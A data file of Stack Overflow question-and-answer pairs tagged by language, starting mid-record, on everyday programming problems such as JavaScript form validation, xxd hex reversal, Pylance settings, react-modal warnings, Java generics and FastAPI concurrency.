<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Fabio Coentrao</td><td>Defesa</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
<tr><td scope=""row"" abbr=""Jogador"" class=""spec"">Pepe</td><td>Médio</td><td><select  name=""escolhaPT""><option value=""EF"">EF</option><option value=""SP"">SP</option><option value=""NU"" selected=""selected"">NU</option></select> </td><td>NU</td></tr>
</tbody>
</table>        
<input type='submit' value='Check Field' />
</form>

Now for a bit of Javascript:
 function ValidaTudo()
{
    alert('debug: validating...')
    if(Valida('PT'))
    {
        alert('fine!');
        return true;
    }
    else
    {
        alert('useless validation message but wth');
        return false;
    }
}

There's more javascript functions, obviously, but:

I'm not getting any alert popup from that javascript function!
The page is, quite simply, redirected to index.php so i'm assuming it's a PHP/WAMP issue... i rebooted WAMP quite a couple of times, but no luck so far. I haven't reboot my PC although I think I should.

What am i missing? Thanks in advance guys!
PS: Yes, the form isn't sending the data to any page at all; i know that; it does not have any effect on the weird behavior, i've tried it.
Edit: Here's the rest of the validating functions. They are used to check if the user followed certains rules (e.g.: selecting exactly 11 players; 1 goal-keeper; at least 3 defenders, etc...). I'm passing a couple of parameters because in the full form we're trying to guess the players of 4 teams (Portugal, Spain, Brazil and Argentina) - hence 4 forms, each with a different ID (based on the nation's identifier -> {PT, BR, AR, ES}
Here's the rest of the functions (keep in mind that they work outside of the form):
function Valida (textstring) 
{
    var error_msg = null; 

    if(!valida_11(textstring.toUpperCase()))
    {
        error_msg = 'Erro para a equipa ' + textstring.toUpperCase() + ': deve selecionar apenas 11 jogadores efectivos';
        alert(error_msg);
    }

    if (!valida_gk(textstring.toUpperCase()))
    {
        error_msg = 'Erro para a equipa ' + textstring.toUpperCase() + ': deve selecionar um e um só 1 guarda-redes efectivo';
        alert(error_msg);
    }

    if (!valida_def(textstring.toUpperCase()))
    {
        error_msg = 'Erro para a equipa ' + textstring.toUpperCase() + ': deve selecionar um mínino de 3 defesas efectivo';
        alert(error_msg);
    }

    if(error_msg == null)
        return true;
    else return false;
}

function valida_11(tbl)
{
    var ef = 0;
    var input_list = document.getElementsByName('escolha' + tbl);

    for(var i = 0; i < input_list.length; i++) 
    {
        var a = input_list[i].value;
        if(a == ""EF"")
            ef++;
    }

    if (ef == 11)
        return true;
    else return false;
}

function valida_gk(tbl)
{   
    var ef = 0;
    var gks = conta_gks(tbl);
    var input_list = document.getElementsByName('escolha' + tbl);

    for(var i = 0; i < gks; i++) 
    {
        var a = input_list[i].value;
        if(a == ""EF"")
            ef++;
    }

    if (ef == 1)
        return true;
    else return false;
}

function valida_def(tbl)
{
    var defs = conta_defs(tbl);
    var gks = conta_gks(tbl);

    var ef = 0;
    var input_list = document.getElementsByName('escolha' + tbl);

    for(var i = gks-1; i < gks + defs; i++) 
    {
        var a = input_list[i].value;
        if(a == ""EF"")
            ef++;
    }

    if (ef >= 3)
        return true;
    else return false;
}

function conta_defs(tbl)
{
    var defs = 0;
    var tabela = document.getElementById('tabela_' + tbl);

    for(var i = 1; i < tabela.getElementsByTagName(""tr"").length; i++)
    {
        var linha = tabela.getElementsByTagName(""tr"")[i];
        var celula = linha.getElementsByTagName(""td"")[1];

        if(celula.innerHTML == ""Defesa"")
            defs++;
    }

    return defs;
}


function conta_gks(tbl)
{
    var gk = 0;
    var tabela = document.getElementById('tabela_' + tbl);

    for(var i = 1; i < tabela.getElementsByTagName(""tr"").length; i++)
    {
        var linha = tabela.getElementsByTagName(""tr"")[i];
        var celula = linha.getElementsByTagName(""td"")[1];

        if(celula.innerHTML == ""Guarda-redes"")
            gk++;
    }

    return gk;
}

Edit 2: The same happens in other browsers, like IE 7.
Edit 3: Rebooted the PC but the issue remains... :/
Okay, i managed to put the page online @: http://testing.freeoda.com/teste.html
Give it a spin. Over here, i'm getting a 404 error; no JS function is called....
","I'm using a crappy menu bar made by another programmer who forgot to close the <form> tag; everything was working as it was supposed to, because the actual form we're seeing was actually inside another one.
",javascript
transform hexadecimal information to binary using a linux command,"I have this binary file on my Linux system...
 udit@udit-Dabba ~ $ cat file.enc
 Salted__s�bO��<0�F���Jw!���]�:`C�LKȆ�l

Using the hexdump command, I see its information like this:
 udit@udit-Dabba ~ $ hexdump -C file.enc
 00000000  53 61 6c 74 65 64 5f 5f  1b 73 a1 62 4f 15 be f6  |Salted__.s.bO...|
 00000010  3c 30 cc 46 ee 10 13 11  84 bf 4a 77 21 a4 84 99  |<0.F......Jw!...|
 00000020  0e 5d ef 11 18 3a 60 43  a0 4c 4b 1e c8 86 e6 6c  |.]...:`C.LK....l|
 00000030

Now I am given a file on some other system whose contents are like this:
 53 61 6c 74 65 64 5f 5f  1b 73 a1 62 4f 15 be f6
 3c 30 cc 46 ee 10 13 11  84 bf 4a 77 21 a4 84 99
 0e 5d ef 11 18 3a 60 43  a0 4c 4b 1e c8 86 e6 6c

And I need to find out that same exact binary information from this hexdump.
How can I proceed for that?
If there isn't any switch for that then C code will also work fine.
(But a Linux command with some switch is preferable)
Limitation:
The binary information in the file is output of an encryption algorithm, so contents should exactly match...
","As @user786653 suggested, use the xxd(1) program:
xxd -r -p input.txt output.bin

",c
kernel bypass for udp and tcp on linux what does it involve,"https://solace.com/blog/kernel-bypass-revving-up-linux-networking/:

[...]a network driver called OpenOnload that use “kernel bypass” techniques to run the application and network driver together in user space and, well,  bypass the kernel. This allows the application side of the connection to process many more messages per second with lower and more consistent latency.
[...]
If  you’re a developer or architect who has fought with context switching for years kernel bypass may feel like cheating, but fortunately it’s completely within the rules.

What are  the functions needed to do such kernel bypassing?
","Okay, so the question is not straight forward to answer without knowing how the kernel handles the network stack.
In generel the network stack is made up of a lot of layers, with the lowest one being the actual hardware, typically this hardware is supported by means of drivers (one for each network interface), the nic's typically provide very simple interfaces, think recieve and send raw data.
On top of this physical connection, with the ability to recieve and send data is a lot of protocols, which are layered as well, near the bottem is the ip protocol, which basically allows you to specify the reciever of your information, while at the top you'll find TCP which supports stable connections.
So in order to answer your question, you most first figure out which part of the network stack you'll need to replace, and what you'll need to do. From my understanding of your question it seems like you'll want to keep the original network stack, and then just sometimes use your own, and in that case you should really just implement the strategy pattern, and make it possible to state which packets should be handled by which toplevel of the network stack.
Depending on how the network stack is implemented in linux, you may or may not be able to achieve this, without kernel changes. In a microkernel architecture, where each part of the network stack is implemented in its own service, this would be trivial, as you would simply pipe your lower parts of the network stack to your strategy pattern, and have this pipe the input to the required network toplevel layers.
",c
vscode  pylance  disable typechecking,"I would like to disable the underlining of errors like .text in this example

But it would be ok for me when eg. driver is wrong written like that

In my defaultSettings.json the parameter for this option is set:
""python.analysis.typeCheckingMode"": ""off"",

And in my settings.json this parameter is not at all.
So why is Pylance still underlining the .text-command?
I only want that it is underlining error like wrong written driver?
","i think i found the solution -
There are 2 settings.json in VSCode - one for ""User"" and one for ""Workspace"":

I only checked the settings.json for ""User"" and there was no entry
for the parameter ""python.analysis.typeCheckingMode""
But when i checked the ""Workspace"" settings.json i saw this entry
python.analysis.typeCheckingMode"": ""basic""

I changed this to ""off"" and now everything works again as wanted.
This are the different options for this parameter for the pylance-extension:

off: No type checking analysis is conducted; unresolved imports/variables diagnostics are produced
basic: Non-type checking-related rules (all rules in off) + basic type checking rules
strict: All type checking rules at the highest severity of error (includes all rules in off and basic categories)

",python
old spring and email validation,"For a middleware that has Java 1.8_431 there is a Spring application
<springframework.version>4.3.1.RELEASE</springframework.version>

I have a model that has an email field that I must to validate and it is represented by this code:
import javax.validation.constraints.Email;

/**
 * The Class RegForm.
 */
public class RegForm {
....


    /** The email. */
    @Email(message = ""Insert a valid email"")
    private String email;

//getter and settser
}

The POM of this application is composed:
<dependency>
    <groupId>org.hibernate.validator</groupId>
    <artifactId>hibernate-validator</artifactId>
    <version>6.1.1.Final</version>
</dependency>

<dependency>
    <groupId>javax.validation</groupId>
    <artifactId>validation-api</artifactId>
    <version>2.0.1.Final</version> <!-- Versione 2.0 o superiore -->
</dependency>

<dependency>
    <groupId>org.glassfish</groupId>
    <artifactId>javax.el</artifactId>
    <version>3.0.0</version> <!-- Necessario per l'Expression Language -->
</dependency>

The Spring Controller that I use this model is:
//many imports
import javax.validation.Valid;
....

@Controller
@RequestMapping(""/reg"")
public class RegController {
    
    @RequestMapping(value = ""/index"", method = RequestMethod.GET)
    public String index(@ModelAttribute(""regForm"") @Valid @RequestBody RegForm  regForm,
            BindingResult result, Model model, final RedirectAttributes redirectAttributes, HttpServletRequest req)
            throws AcceleratoreException {
......
}

When I start the application and I call this API, the server response status 500 and the log says:

Root cause of ServletException.
javax.validation.UnexpectedTypeException: HV000030: No validator could be found for constraint 'javax.validation.constraints.Email' validating type 'java.lang.String'. Check configuration for 'email

","I think you're using a pretty old version of hibernate validator.
Do you need to use org.hibernate.validator.constraints.Email (this is deprecated in later releases for jakarta.validation.constraints.Email)
",java
linux kernel generate compilecommandsjson for module,"The problem: Most of macro definition and even header files are not looked up by an IDE because include path is not specified in the IDE configuration. It inhibits autocompletion and navigation.
Here is my Makefile:
#-Wno-declaration-after-statement
ccflags-y := -std=gnu11 -Wno-declaration-after-statement -Werror
obj-m += pfsw.o
pfsw-objs := src/init.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

I ran make V=1 and noticed that the compile command along with include path is actually pretty cumbersome (counting Linux Specific -include for parameters):
gcc -Wp,-MD,/home/memyself/lkm/procfs_write/src/.init.o.d -nostdinc \
   -isystem /usr/lib/gcc/x86_64-linux-gnu/7/include \
   -I./arch/x86/include -I./arch/x86/include/generated \
   -I./include -I./arch/x86/include/uapi \
   -I./arch/x86/include/generated/uapi -I./include/uapi \
   -I./include/generated/uapi \
   -include ./include/linux/kconfig.h -Iubuntu/include \
   -include ./include/linux/compiler_types.h \
   -D__KERNEL__ \
   ...tons of options ommitted...
   -c -o /home/memyself/lkm/procfs_write/src/init.o \
   /home/memyself/lkm/procfs_write/src/init.c

Question: Is there a way to generate compile-command.json to inform IDE about include paths? Or the only solution is to manually pass the include path to the IDE one by one?
","Due to CLang has a lot of different tools, including some to analyze the code, the compile-command.json is required. That's why Tom Roeder from Google provided a
scripts/clang-tools/gen_compile_commands.py in the commit b30204640192 (""scripts: add a tool to produce a compile_commands.json file"") for this.
Note, kernel must be compiled at least once to make this script work.
P.S. I suppose you are trying MS Visual Studio Code?
Kudos to colleague of mine, Alex, who is user of it and told me about existence of such script.
",c
quotwarning reactmodal app element is not defined please use modalsetappelementel or set appelementelquot,"How do I fix this warning in console of a React app using the react-modal package:

Warning: react-modal: App element is not defined. Please use Modal.setAppElement(el) or set appElement={el}

I have not been successful at figuring out what el is supposed to be.
Context:
in my App.js root component file:
...
import Modal from 'react-modal';
...
class App extends Component {
  ...
  render(){
    ...  
    <Modal
      className=""modal""
      overlayClassName=""overlay""
      isOpen={foodModalOpen}
      onRequestClose={this.closeFoodModal}
      contentLabel=""Modal""
    >
    ...
  }
}

Where ... indicates code not shown.
Everything works fine, but when the Modal is opened, the following Warning appears in my console:

index.js:2177 Warning: react-modal: App element is not defined. Please use Modal.setAppElement(el) or set appElement={el}. This is needed so screen readers don't see main content when modal is opened. It is not recommended, but you can opt-out by setting ariaHideApp={false}.

In the react-modal docs all I can find is the following:

App Element
The app element allows you to specify the portion of your app that should be hidden (via aria-hidden) to prevent assistive technologies such as screenreaders from reading content outside of the content of your modal.


If you are doing server-side rendering, you should use this property.


It can be specified in the following ways:


DOMElement
Modal.setAppElement(appElement);
query selector - uses the first element found if you pass in a class.
Modal.setAppElement('#your-app-element');

Unfortunately, this has not helped! I cannot figure out what el is supposed to represent.
Here are some of the many property variations I have tried adding to my Modal component:
`appElement={el}`,  
`appElement=""root""` where `root` is the id that my App component is injected into   
`appElement={'root'}`   
`appElement=""div""`,   
`appElement={<div>}`,   
`appElement={""div""}`  

I've also tried calling Modal.setAppElement('root'); from inside src/index.js, where root is the root element that my App component is injected into, and index.js is where I do that.
","Some solutions are given in react-modal issue #133: 
The problem lies here: 
Depending on when it evaluates react-modal@1.6.5:/lib/helpers/ariaAppHider.js#L1:

document.body does not exist yet and it will resolve to undefined || null.  
if Modal.setAppElement() is called with null or not called at all with the <script /> placed on <head /> (same as above).  
Probably it can also happen if called with a selector that does not match any results.

Solutions:
Browser Rendering:
@yachaka snippet prevents this behavior by defining the element before placing the <Modal />:  
componentWillMount() {
    Modal.setAppElement('body');
}

@ungoldman answer, if you don't want to depend on `setAppElement':  

Inject the bundled application JS into <body> instead of <head>.
  Though ideally react-modal should wait until the DOM is loaded to try attaching to document.body.

server-side:

If rendering on server-side, you must provide a document.body, before requiring the modal script (perhaps it should be preferable to use setAppElement() in this case).


Update: 
react docs have been updated to include the information above, so they should now be clearer for users running into this issue.
react-modal issue #567: add information (from issue #133 linked above) to the docs.
",javascript
what is the java equivalent of c39s templates,"What is the Java equivalent of C++'s templates?
I know that there is an interface called Template. Is that related?
","Templates as in C++ do not exist in Java. The best approximation is generics.
One huge difference is that in C++ this is legal:
<typename T> T sum(T a, T b) { return a + b; } 

There is no equivalent construct in Java. The best that you can say is 
<T extends Something> T Sum(T a, T b) { return a.add(b); }

where Something has a method called add. 
In C++, what happens is that the compiler creates a compiled version of the template for all instances of the template used in code. Thus if we have
int intResult = sum(5, 4);
double doubleResult = sum(5.0, 4.0);

then the C++ compiler will compile a version of sum for int and a version of sum for double.
In Java, there is the concept of erasure. What happens is that the compiler removes all references to the generic type parameters. The compiler creates only one compiled version of the code regardless of how many times it is used with different type parameters. 
Other differences

C++ does not allow bounding of type parameters whereas Java does
C++ allows type parameters to be primitives whereas Java does not
C++ allows templates type parameters to have defaults where Java does not
C++ allows template specialization whereas Java does not
And, as should be expected by this point, C++ style template metaprogramming is impossible with Java generics.
Forget about seeing the curiously recurring template pattern in Java
Policy-based design is impossible in Java

",java
dynamic flickr background image for css tag,"I am trying to update my flickr gallery script to instead replace a background image url with the output of the flickr script.
I created a pen here showing my progress.
<div id=""banner"">
    <div class=""container"">
        <header>
            <div class=""row"">
            </div>
            <h2>Page Title</h2>
        </header>
    </div>
</div>

And the Javascript
// Top Banner Flickr Script 
var flickrID = '189509301@N03'; 
var photoCount = '1'; 
var tags = ""'featured','hcdbanner'""; // PHOTO TAGS
var tagmode=""all""
if (tags != ''){tags = '&tags=' + tags}
var limit = photoCount-1;
var bannerUrl = 'https://api.flickr.com/services/feeds/photos_public.gne?id=' + flickrID + '&per_page=' + photoCount + '' + tags + '&format=json';
$.ajax({
    url: bannerUrl,
    dataType: ""jsonp"",
    jsonp: 'jsoncallback',
    success: function (data) {
        let bannerUrl = data.items.map(item => 
        'url(' + item.media.m.replace('_m','_b') + ')').join(',');
        $('#banner').css('background-image', bannerUrl);
    }
});   

And the CSS
#banner {
     background: linear-gradient(180deg, rgba(255, 255, 255, 1) 0%, rgba(67,65,159,.025) 25%);   
     position: relative;
     background-position: center center;
     padding: 10em 0em;
     background-size: cover;         
     margin-top: 20px;
     background-repeat: no-repeat;              
}
#banner header h2 {
     font-size: 2.8em;         
     text-align: center;
     color: #FFFFFF;
     text-shadow: 2px 2px #595959;
}

The idea behind it would be for each image on our flickr account we give a certain set of tags, it would then append it as a background image for the #banner tag. with a top gradient fading to white.
Would anyone be able top provide the proper way to attach the output to the #banner tag?
","There are multiple problems in the ajax success function. If you check the console, you'll see there is a syntax error in the code that creates the background urls. In addition, the code is adding the urls to the banner as html rather than as css.
To fix these problems, modify the string formatting to:
'url(' + item.media.m.replace('_m','_b') + ')' 

// output: url(https://live.staticflickr.com/65535/54200949335_190f6313a7_b.jpg)

Array.map followed by Array.join is a better way to combine these urls than jQuery.each.
The list of background image urls can then be applied using jQuery css
$('#banner').css('background-image', flickrhtml);

And here is the final result with minimal changes to your original code:


// Top Banner Flickr Script 
var flickrID = '189509301@N03'; 
var photoCount = '1'; 
var tags = ""'featured','hcdbanner'""; // PHOTO TAGS
var tagmode=""all""
if (tags != ''){tags = '&tags=' + tags}
var limit = photoCount-1;
var flickrUrl = 'https://api.flickr.com/services/feeds/photos_public.gne?id=' + flickrID + '&per_page=' + photoCount + '' + tags + '&format=json';
$.ajax({
  url: flickrUrl,
  dataType: ""jsonp"",
  jsonp: 'jsoncallback',
  success: function (data) {
  
    let flickrhtml = data.items.map(item => 
      'url(' + item.media.m.replace('_m','_b') + ')').join(',');

    $('#banner').css('background-image', flickrhtml);
    
  }
});     
#banner {
 background: linear-gradient(180deg, rgba(255, 255, 255, 1) 0%, rgba(67,65,159,.025) 25%);   
  position: relative;
  background-position: center center;
  padding: 10em 0em;
  background-size: cover;
  text-align: center;
  margin-top: 20px;
}

#banner header h2 {
  font-size: 2.8em;
  color: #FFFFFF;
  text-shadow: 2px 2px #595959;
}
<link href=""https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.0.2/css/bootstrap.min.css"" rel=""stylesheet"">
<script src=""https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js""></script>

<div id=""banner"">
  <div class=""container"">
    <header>
      <div class=""row""></div>
      <h2>Houston Housing &amp; Community Development</h2>
    </header>
  </div>
</div>



",javascript
fastapi runs apicalls in serial instead of parallel fashion,"I have the following code:
import time
from fastapi import FastAPI, Request
    
app = FastAPI()
    
@app.get(""/ping"")
async def ping(request: Request):
        print(""Hello"")
        time.sleep(5)
        print(""bye"")
        return {""ping"": ""pong!""}

If I run my code on localhost—e.g., http://localhost:8501/ping—in different tabs of the same browser window, I get:
Hello
bye
Hello
bye

instead of:
Hello
Hello
bye
bye

I have read about using httpx, but, still, I cannot have a true parallelization. What's the problem?
","As per FastAPI's documentation:

When you declare a path operation function (also known as endpoint) with normal def instead
of async def, it is run in an external threadpool that is then
awaited, instead of being called directly (as it would block the
server).

also, as described here:

If you are using a third party library that communicates with
something (a database, an API, the file system, etc.) and doesn't have
support for using await, (this is currently the case for most
database libraries), then declare your path operation functions as
normally, with just def.
If your application (somehow) doesn't have to communicate with
anything else and wait for it to respond, use async def.
If you just don't know, use normal def.
Note: You can mix def and async def in your path operation functions as much as you need and define each one using the best
option for you. FastAPI will do the right thing with them.
Anyway, in any of the cases above, FastAPI will still work
asynchronously and be extremely fast.
But by following the steps above, it will be able to do some
performance optimizations.

Thus, in order to avoid blocking the server, a def endpoint—in the context of asynchronous programming, a function defined with just def is called synchronous function—in FastAPI, will still run in the event loop, but instead of calling it directly, FastAPI will run a def endpoint in a separate thread from an external threadpool that is then awaited (more details on the external threadpool are given later on), and hence, FastAPI will still work asynchronously. In other words, the server will process requests to such endpoints concurrently (at the cost, though, of spawning a new thread or reusing an existing thread from the threadpool, for every incoming request to such endpoints). Whereas, async def endpoints run directly in the event loop—which runs in a single thread, typically the main thread of a process/worker, and, in this case, is created when calling, for instance, uvicorn.run(), or the equivalent method of some other ASGI server—that is, the server will also process requests to such endpoints concurrently/asynchronously, as long as there is an await call to non-blocking I/O-bound operations inside such async def endpoints/routes, such as waiting for (1) data from the client to be sent through the network, (2) contents of a file in the disk to be read, (3) a database operation to finish, etc., (have a look here).
However, if an endpoint defined with async def does not await for some coroutine inside (i.e., a coroutine object is the result of calling an async def function), in order to give up time for other tasks in the event loop to run (e.g., requests to the same or other endpoints, background tasks, etc.), each request to such an endpoint will have to be completely finished (i.e., exit the endpoint), before returning control back to the event loop and allowing other tasks in the event loop to run (see this answer, if you would like to get and monitor all pending tasks in an event loop). In other words, in such cases, the server would be ""blocked"", and hence any requests would be processed sequentially.
Having said that, you should still consider defining an endpoint with async def, if your endpoint does not have to execute a blocking operation inside that has to wait for it to respond, but is instead used to return simple JSON data, a simple HTMLResponse (see FastAPI docs as well) or even a FileResponse (in which case the file contents will be read asynchronously and in chunks, regardless, using await anyio.open_file(), as can be seen in the relevant FileResponse class implementation), even if there is not an await statement inside the endpoint in such cases, as FastAPI would likely perform better, when running such a simple endpoint directly in the event loop, rather than running the endpoint in a separate thread from the external threadpool (which would be the case, if the endpoint was instead defined with normal def). If, however, you had to return some complex and large JSON data, either encoding them on your own within the endpoint, as shown in the linked answer earlier, or using Starlette's JSONResponse or FastAPI's ORJSONResponse/UJSONResponse (see this related answer as well), that all these classes would encode the data in a synchronous way, using json.dumps() and orjson.dumps()/ujson.dumps() respectively, in that case, you should might consider having the endpoint defined with normal def (related answers could be found here and here). Otherwise, you could keep using an async def endpoint, but have any blocking operations taking place inside (e.g., orjson.dumps() or df.to_json()) run in a separate thread/process, as described in the solutions provided later on (in such cases, always perform benchmark tests, similar to this answer, and compare the results to find the best-performing approach).
Note that the same concept not only applies to endpoints, but also to functions that are used as StreamingResponse's generators (see StreamingResponse class implementation) or Background Tasks (see BackgroundTask class implementation and this answer), meaning that FastAPI, behind the scenes, will also run such functions defined with normal def in a separate thread from the same external threadpool; whereas, if such functions were defined with async def instead, they would run directly in the event loop. In order to run an endpoint or a function described above in a separate thread and await it, FastAPI uses Starlette's asynchronous run_in_threadpool() function, which, under the hood, calls anyio.to_thread.run_sync(). The default number of worker threads of that external threadpool is 40 and can be adjusted as required—please have a look at this answer for more details on the external threadpool and how to adjust the number of threads. Hence, after reading this answer to the end, you should be able to decide whether you should define a FastAPI endpoint, StreamingResponse's generator or BackgroundTask function with def or async def, as well as, based on the requirements of your project, whether or not you should increase the number of threads of the external threadpool.
Python's async def function and await
The keyword await (which only works within an async def function) passes function control back to the event loop. In other words, it suspends the execution of the surrounding coroutine, and tells the event loop to let some other task run, until that awaited task is completed. Note that just because you may define a custom function with async def and then await it inside your async def endpoint, it doesn't mean that your code will work asynchronously, if that custom function contains, for example, calls to time.sleep(), CPU-bound tasks, non-async I/O libraries, or any other blocking call that is incompatible with asynchronous Python code. In FastAPI, for example, when using the async methods of UploadFile, such as await file.read() and await file.close(), FastAPI/Starlette, behind the scenes, actually calls the corresponding synchronous File methods in a separate thread from the external threadpool described earlier (using run_in_threadpool()) and awaits it; otherwise, such methods/operations would block the event loop—you could find out more by looking at the implementation of the UploadFile class.
Note  that async does not mean parallel, but concurrently. As mentioned earlier, asynchronous code with async and await is many times summarized as using coroutines. Coroutines are collaborative (or cooperatively multitasked), meaning that ""at any given time, a program with coroutines is running only one of its coroutines, and this running coroutine suspends its execution only when it explicitly requests to be suspended"" (see here and here for more info on coroutines).
As described in this article:

Specifically, whenever execution of a currently-running coroutine
reaches an await expression, the coroutine may be suspended, and
another previously-suspended coroutine may resume execution if what it
was suspended on has since returned a value. Suspension can also
happen when an async for block requests the next value from an
asynchronous iterator or when an async with block is entered or
exited, as these operations use await under the hood.

If, however, a blocking I/O-bound or CPU-bound operation was directly executed/called inside an async def function/endpoint, it would then block the event loop, and hence, the main thread would be blocked as well. Hence, a blocking operation such as time.sleep() in an async def endpoint would block the entire server (as in the code example provided in your question). Thus, if your endpoint is not going to make any async calls, you could declare it with normal def instead, in which case, FastAPI would run it in a separate thread from the external threadpool and await it, as explained earlier (more solutions are given in the following sections). Example:
@app.get(""/ping"")
def ping(request: Request):
    #print(request.client)
    print(""Hello"")
    time.sleep(5)
    print(""bye"")
    return ""pong""

Otherwise, if the functions that you had to execute inside the endpoint are async functions that you had to await, you should define your endpoint with async def. To demonstrate this, the example below uses the asyncio.sleep() function (from the asyncio library), which provides a non-blocking sleep operation. The await asyncio.sleep() method will suspend the execution of the surrounding coroutine (until the sleep operation is completed), thus allowing other tasks in the event loop to run. Similar examples are given here and here as well.
import asyncio
 
@app.get(""/ping"")
async def ping(request: Request):
    #print(request.client)
    print(""Hello"")
    await asyncio.sleep(5)
    print(""bye"")
    return ""pong""

Both the endpoints above will print out the specified messages to the screen in the same order as mentioned in your question—if two requests arrived at (around) the same time—that is:
Hello
Hello
bye
bye

Important Note
When using a web browser to call the same endpoint for the second (third, and so on) time, please remember to do that from a tab that is isolated from the browser's main session; otherwise, succeeding requests (i.e., coming after the first one) might be blocked by the browser (on client side), as the browser might be waiting for a response to the previous request from the server, before sending the next request. This is a common behaviour for the Chrome web browser at least, due to waiting to see the result of a request and check if the result can be cached, before requesting the same resource again.
You could confirm that by using print(request.client) inside the endpoint, where you would see the hostname and port number being the same for all incoming requests—in case the requests were initiated from tabs opened in the same browser window/session; otherwise, the port number would normally be different for every request—and hence, those requests would be processed sequentially by the server, because of the browser/client sending them sequentially in the first place. To overcome this, you could either:

Reload the same tab (as is running), or

Open a new tab in an Incognito Window, or

Use a different web browser/client to send the request, or

Use the httpx library to make asynchronous HTTP requests, along with the awaitable asyncio.gather(), which allows executing multiple asynchronous operations concurrently and then returns a list of results in the same order the awaitables (tasks) were passed to that function (have a look at this answer for more details).
Example:
import httpx
import asyncio

URLS = ['http://127.0.0.1:8000/ping'] * 2

async def send(url, client):
    return await client.get(url, timeout=10)

async def main():
    async with httpx.AsyncClient() as client:
        tasks = [send(url, client) for url in URLS]
        responses = await asyncio.gather(*tasks)
        print(*[r.json() for r in responses], sep='\n')

asyncio.run(main())

In case you had to call different endpoints that may take different time to process a request, and you would like to print the response out on client side as soon as it is returned from the server—instead of waiting for asyncio.gather() to gather the results of all tasks and print them out in the same order the tasks were passed to the send() function—you could replace the send() function of the example above with the one shown below:
async def send(url, client):
    res = await client.get(url, timeout=10)
    print(res.json())
    return res



Async/await and Blocking I/O-bound or CPU-bound Operations
If you are required to define a FastAPI endpoint (or a StreamingResponse's generator, or a background task function)  with async def (as you might need to await for some coroutines inside it), but also have some synchronous blocking I/O-bound or CPU-bound operation (computationally intensive task) that would block the event loop (essentially, the entire server) and wouldn't let other requests to go through, for example:
@app.post(""/ping"")
async def ping(file: UploadFile = File(...)):
    print(""Hello"")
    try:
        contents = await file.read()
        res = cpu_bound_task(contents)  # this would block the event loop
    finally:
        await file.close()
    print(""bye"")
    return ""pong""

then:

You should check whether you could change your endpoint's definition to normal def instead of async def. One way, if the only method in your endpoint that had to be awaited was the one reading the file contents would be to declare the file contents parameter as bytes, i.e., contents: bytes = File(). Using that definition, FastAPI would read the file for you and you would receive the contents as bytes. Hence, there would be no need to use an async def endpoint with await file.read() inside. Please note that this approach (i.e., using contents: bytes = File()) should work fine for small files; however, for larger files, and always depending on your server's resources, this might cause issues, as the enitre file contents would be stored to memory (see the documentation on File Parameters). Hence, if your system does not have enough RAM available to accommodate the accumulated data, your application may end up crashing—if, for instance, you have 8GB of RAM (the available RAM will always be less than the amount installed on your device, as other apps/services will be using it as well), you can't load a 50GB file.
Alternatively, you could use file: UploadFile = File(...) definition in your endpoint, but this time call the synchronous .read() method of the SpooledTemporaryFile directly, which can be accessed through the .file attribute of the UploadFile object. In this way, you will be able to declare your endpoint with a normal def instead, and hence, each request will run in a separate thread from the external threadpool and then be awaited (as explained earlier). Example is given below. For more details on how to upload a File, as well as how FastAPI/Starlette uses the SpooledTemporaryFile behind the scenes when uploading a File, please have a look at this answer and this answer.
@app.post(""/ping"")
def ping(file: UploadFile = File(...)):
    print(""Hello"")
    try:
        contents = file.file.read()
        res = cpu_bound_task(contents)
    finally:
        file.file.close()
    print(""bye"")
    return ""pong""

Another way, when you would like having the endpoint defined with normal def, as you would need to run blocking operations inside and would like having the endpoint run in a separate thread instead of calling it directly in the event loop, but at the same time you would have to await for coroutines, is to await such coroutines inside an async dependency instead, as explained and demonstrated in Update 2 of this answer, and have the result returned to the def endpoint.

Use FastAPI's (Starlette's) run_in_threadpool() function from the concurrency module—as @tiangolo suggested here—which ""will run the function in a separate thread to ensure that the main thread (where coroutines are run) does not get blocked"" (see here). run_in_threadpool is an awaitable function, where its first parameter is a normal function, and the following parameters are passed to that function directly. It supports both sequence and keyword arguments.
from fastapi.concurrency import run_in_threadpool

res = await run_in_threadpool(cpu_bound_task, contents)


Alternatively, use asyncio's loop.run_in_executor()—after obtaining the running event loop using asyncio.get_running_loop()—to run the task, which, in this case, you can await for it to complete and return the result(s), before moving on to the next line of code. Passing None to the executor argument, the default executor will be used; which is a ThreadPoolExecutor:
import asyncio

loop = asyncio.get_running_loop()
res = await loop.run_in_executor(None, cpu_bound_task, contents)

or, if you would like to pass keyword arguments instead, you could use a lambda expression (e.g., lambda: cpu_bound_task(some_arg=contents)), or, preferably, functools.partial(), which is specifically recommended in the documentation for loop.run_in_executor():
import asyncio
from functools import partial

loop = asyncio.get_running_loop()
res = await loop.run_in_executor(None, partial(cpu_bound_task, some_arg=contents))

In Python 3.9+, you could also use asyncio.to_thread() to asynchronously run a synchronous function in a separate thread—which, essentially, uses await loop.run_in_executor(None, func_call) under the hood, as can been seen in the implementation of asyncio.to_thread(). The to_thread() function takes the name of a blocking function to execute, as well as any arguments (*args and/or **kwargs) to the function, and then returns a coroutine that can be awaited. Example:
import asyncio

res = await asyncio.to_thread(cpu_bound_task, contents)

Note that as explained in this answer, passing None to the executor argument does not create a new ThreadPoolExecutor every time you call await loop.run_in_executor(None, ...), but instead re-uses the default executor with the default number of worker threads (i.e., min(32, os.cpu_count() + 4)). Thus, depending on the requirements of your application, that number might not be enough. In that case, you should rather use a custom ThreadPoolExecutor. For instance:
import asyncio
import concurrent.futures

loop = asyncio.get_running_loop()
with concurrent.futures.ThreadPoolExecutor() as pool:
    res = await loop.run_in_executor(pool, cpu_bound_task, contents)

I would strongly recommend having a look at the linked answer above to learn about the difference between using run_in_threadpool() and run_in_executor(), as well as how to create a re-usable custom ThreadPoolExecutor at the application startup, and adjust the number of maximum worker threads as needed.

